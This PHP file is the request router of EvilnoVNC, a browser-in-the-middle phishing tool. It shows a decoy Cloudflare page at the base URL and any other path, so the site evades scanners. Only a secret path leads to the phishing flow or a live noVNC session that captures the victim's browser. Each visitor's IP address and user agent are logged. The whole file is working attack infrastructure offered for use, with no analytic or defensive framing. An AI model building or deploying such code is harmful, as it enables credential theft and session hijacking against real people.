<?php
/**
 * EvilnoVNC router: base URL -> fake Cloudflare page; secret path -> phishing flow.
 * Secret path is read from php.ini SECRET_PATH (default: 12098e2fklj.html).
 */
$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$path = parse_url($requestUri, PHP_URL_PATH) ?? '/';
$path = '/' . trim($path, '/');
if ($path === '//') {
    $path = '/';
}

$logFile = '/home/user/Downloads/access.log';
$log = function ($type) use ($path, $logFile) {
    $ts = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? '?';
    $ua = trim($_SERVER['HTTP_USER_AGENT'] ?? '-');
    if (strlen($ua) > 80) {
        $ua = substr($ua, 0, 77) . '...';
    }
    @file_put_contents($logFile, "$ts | $type | $ip | $path | $ua\n", FILE_APPEND | LOCK_EX);
};

// Only the exact secret path gets the phishing flow or VNC; everything else gets the fake page only.
$config = @parse_ini_file(__DIR__ . '/php.ini', false);
$secretPath = isset($config['SECRET_PATH']) ? trim($config['SECRET_PATH']) : '12098e2fklj.html';
$secretPath = ltrim($secretPath, '/');
$secretPathFull = ($secretPath !== '') ? '/' . $secretPath : null;

// Exact secret path only: either VNC (if session ready) or phishing flow
if ($secretPathFull !== null && $path === $secretPathFull) {
    $vncReady = @file_exists('/tmp/vnc_ready');
    if ($vncReady) {
        $log('VNC_SESSION');
        $vncHtml = file_get_contents(__DIR__ . '/noVNC/vnc_lite.html');
        $vncHtml = str_replace('<head>', '<head><base href="/' . $secretPath . '/">', $vncHtml);
        $vncHtml = str_replace("readQueryVariable('path', 'websockify')", "'" . $secretPath . "/websockify'", $vncHtml);
        $titlePath = __DIR__ . '/title.txt';
        if (is_readable($titlePath)) {
            $title = trim(file_get_contents($titlePath));
            if ($title !== '') {
                $vncHtml = preg_replace('/<title>\s*<\/title>/', '<title>' . htmlspecialchars($title) . '</title>', $vncHtml);
            }
        }
        header('Content-Type: text/html; charset=utf-8');
        echo $vncHtml;
        return true;
    }
    $log('PHISHING_FLOW');
    require __DIR__ . '/index.php';
    return true;
}

// Base URL and any other path: serve fake Cloudflare page
$log('FAKE_PAGE');
$fakePath = __DIR__ . '/CloudflareFake.html';
if (is_readable($fakePath)) {
    header('Content-Type: text/html; charset=utf-8');
    readfile($fakePath);
} else {
    header('HTTP/1.0 404 Not Found');
    echo 'Not Found';
}
// Return true so the server uses our output; return false would make it serve the requested file (e.g. index.php for /)
return true;
